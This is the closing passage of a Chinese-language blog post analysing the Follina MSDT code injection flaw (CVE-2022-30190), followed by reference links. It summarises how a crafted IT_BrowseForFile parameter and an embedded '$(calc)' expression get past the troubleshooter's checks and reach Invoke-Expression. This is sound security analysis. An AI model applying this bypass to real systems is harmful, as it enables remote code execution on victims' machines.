+<p>样本利用Office远程模板访问远程html，并利用<code class="language-plaintext highlighter-rouge">mshtml!ShellExecURL</code>函数解析了URI，调用了msdt.exe。msdt调用PCWDiagnostic程序兼容性诊断包，构造了特殊的IT_BrowseForFile参数绕过了<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>对于路径是否存在和后缀是否为可执行的校验，将路径作为参数传入并执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，该脚本检测路径后缀为.exe后便直接调用<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>执行了命令行，由于命令行中嵌入了表达式<code class="language-plaintext highlighter-rouge">$(calc)</code>，造成了代码注入触发漏洞。</p>
+
+<p>漏洞本身并不复杂，利用也很简单，但是嵌入rtf格式文件配合预览窗格能构成一个Zero-click漏洞，产生的危害还是很大的。分析漏洞的过程中也学习了很多dotnet程序的调试技巧和PowerShell命令行的执行流程，感谢各位师傅精彩的分析文章。</p>
+
+<h1 id="参考链接">参考链接</h1>
+
+<p>[1] CVE-2022-30190 MSDT 代码注入漏洞分析：<em>https://paper.seebug.org/1913/</em></p>
+
+<p>[2] Follina Microsoft Office RCE with MS-MSDT Protocol：<em>https://y4er.com/post/follina-microsoft-office-rce-with-ms-msdt-protocol/</em></p>
+
+<p>[3] Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit：<em>https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/</em></p>
+
+<p>[4] Windows Troubleshooting Platform：<em>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/windows-troubleshooting-toolkit-portal</em></p>
+
+<p>[5] CreateUri function：<em>https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)</em></p>
+
+:ET
